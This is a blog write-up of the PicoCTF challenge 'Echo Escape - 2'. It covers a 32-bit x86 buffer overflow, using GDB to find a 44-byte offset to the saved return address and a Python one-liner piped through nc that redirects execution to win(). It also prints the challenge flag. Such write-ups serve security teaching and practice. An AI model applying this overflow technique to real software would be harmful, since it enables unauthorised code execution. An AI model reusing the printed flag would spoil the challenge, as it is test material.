---
layout: post
title: "Echo Escape - 2 Write-up (PicoCTF)"
description: "A 32-bit x86 buffer overflow CTF write-up: analyzing 32-bit stack frames in GDB, calculating 44-byte offset to saved EIP, and packing target win() with struct.pack('<I')."
tags: [CTF, PicoCTF, Binary Exploitation, Buffer Overflow, GDB, Pwn, x86, C]
category: security
image: https://nirusaki.me/assets/img/og/home.png
---

Hello guys! Today we are diving back into **Buffer Overflow** with **Echo Escape - 2** from PicoCTF. Last time we dealt with a 64-bit binary, but today we are tackling a 32-bit x86 architecture challenge! So gear up, let's get into the terminal!

![Hacker Cat](https://media.tenor.com/Y1aMKkpzZFkAAAAM/hacker-cat.gif)

---

### What's New in 32-Bit Exploitation?

In 64-bit binaries, pointers and registers (`rax`, `rbp`, `rip`) are 8 bytes (64 bits), so we used `struct.pack("<Q", address)` (`<Q` = unsigned 64-bit int in Little-Endian).

In **32-bit x86 binaries**:
- Pointers and registers (`eax`, `ebp`, `eip`) are **4 bytes** (32 bits).
- We use `struct.pack("<I", address)` (`<I` = unsigned 32-bit int in Little-Endian).
- The return address is stored at `$ebp + 4` instead of `$rbp + 8`.

---

### Step 1: Loading Binary into GDB & Disassembling `vuln`

First, fire up GDB on the target `vuln` binary:

```bash
gdb ./vuln
```

![Matrix Code](https://media.tenor.com/72Cg38bV_tYAAAAM/matrix-coding.gif)

Let's disassemble the `vuln` function to inspect the assembly instructions:

```gdb
(gdb) set disassembly-flavor intel
(gdb) disassemble vuln
```

**Disassembly Output:**

```x86asm
Dump of assembler code for function vuln:
   0x08049328 <+0>:   endbr32
   0x0804932c <+4>:   push   ebp
   0x0804932d <+5>:   mov    ebp,esp
   0x0804932f <+7>:   push   ebx
   0x08049330 <+8>:   sub    esp,0x24
   ...
   0x08049370 <+72>:  push   0x80
   0x08049375 <+77>:  lea    eax,[ebp-0x28]
   0x08049378 <+80>:  push   eax
   0x08049379 <+81>:  call   0x80490f0 <fgets@plt>
   0x0804937e <+86>:  add    esp,0x10
   ...
   0x0804939b <+115>: leave
   0x0804939c <+116>: ret
End of assembler dump.
```

Notice `lea eax, [ebp-0x28]` right before `fgets` — the input buffer starts at `$ebp - 0x28`!

---

### Step 2: Finding Target `win()` Address & Calculating Offset

![Mr Robot Hacking](https://media.tenor.com/OQF2CQfjiG8AAAAC/mr-robot.gif)

Set a breakpoint right before `fgets` at `*vuln+77` (`0x08049375`) and run:

```gdb
(gdb) b *vuln+77
Breakpoint 1 at 0x8049375

(gdb) run
Starting program: /home/nirusaki/Downloads/vuln
Enter the secret key: 

Breakpoint 1, 0x08049375 in vuln ()
```

Now let's inspect the buffer pointer and saved return address (`EIP`):

```gdb
(gdb) p/x $ebp-0x28
$1 = 0xffffd410

(gdb) info frame
Stack level 0, frame at 0xffffd440:
 eip = 0x8049375 in vuln; saved eip = 0x80493c0
 Arglist at 0xffffd438, args: 
 Locals at 0xffffd438
 Saved registers:
  ebx at 0xffffd434, ebp at 0xffffd438, eip at 0xffffd43c
```

Notice:
- Buffer Address (`buf`): `0xffffd410` (`$ebp - 0x28`)
- Saved EIP (Return Address): `0xffffd43c` (`$ebp + 4`)

Now let's find the pointer to the target `win()` function:

```gdb
(gdb) p/x &win
$8 = 0x8049276
```

#### Offset Calculation

```text
  Saved EIP Address : 0xffffd43c
- Buffer Address    : 0xffffd410
---------------------------------
  Total Offset      : 0x2C (44 bytes)
```

We need **44 bytes of padding** before injecting our 32-bit `win()` address `0x08049276`.

#### 32-Bit Stack Frame Layout

```text
+-------------------------------------------------------+
|  buf Array Buffer             [0xffffd410]            |  <-- $ebp - 0x28
+-------------------------------------------------------+
|  Saved EBX & Saved EBP        [8 bytes padding]       |
+-------------------------------------------------------+
|  Saved EIP (Return Address)   [0xffffd43c]            |  <-- Overwritten to &win()
+-------------------------------------------------------+

Offset Calculation:
  0xffffd43c - 0xffffd410 = 44 bytes total

Payload Structure:
  [ 'A' * 44 bytes ] + [ 0x08049276 (win() address packed with <I) ]
```

---

### Step 3: Crafting the 32-Bit Exploit One-Liner

Because this is a **32-bit binary**, we pack the target address using `struct.pack("<I", 0x08049276)` (`<I` for 32-bit Little-Endian unsigned int) rather than `<Q` used in 64-bit architecture:

```python
python3 -c 'import struct,sys; sys.stdout.buffer.write(b"A"*44 + struct.pack("<I", 0x08049276) + b"\n")' | nc dolphin-cove.picoctf.net 60293
```

---

### Step 4: Executing Exploit & Getting the Flag

Let's pipe the payload straight into the remote CTF instance:

```text
╭─ ~/Downloads                                                                                                          07:19:07 PM
╰─❯ python3 -c 'import struct,sys; sys.stdout.buffer.write(b"A"*44 + struct.pack("<I",0x08049276) + b"\n")' | nc dolphin-cove.picoctf.net 60293
Enter the secret key: You entered:, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAv

Flag: picoCTF{fgets_0v3rfl0w42_a4f2ece1}
```

![Flag Captured](https://media.tenor.com/XtDTW3LFxdYAAAAM/hacker-cyber.gif)

![Mission Passed](https://media.tenor.com/MbYw4kRu0E0AAAAd/gta-gta-san-andreas.gif)

BOOM! We bypassed the input validation, redirected execution to `win()`, and retrieved the flag `picoCTF{fgets_0v3rfl0w42_a4f2ece1}`!

---

Goodbye, see you later!  
**Nirusaki signing out.**

![Sayonara](https://media.tenor.com/Lh26WPaDUk4AAAAM/goodbye-wave.gif)
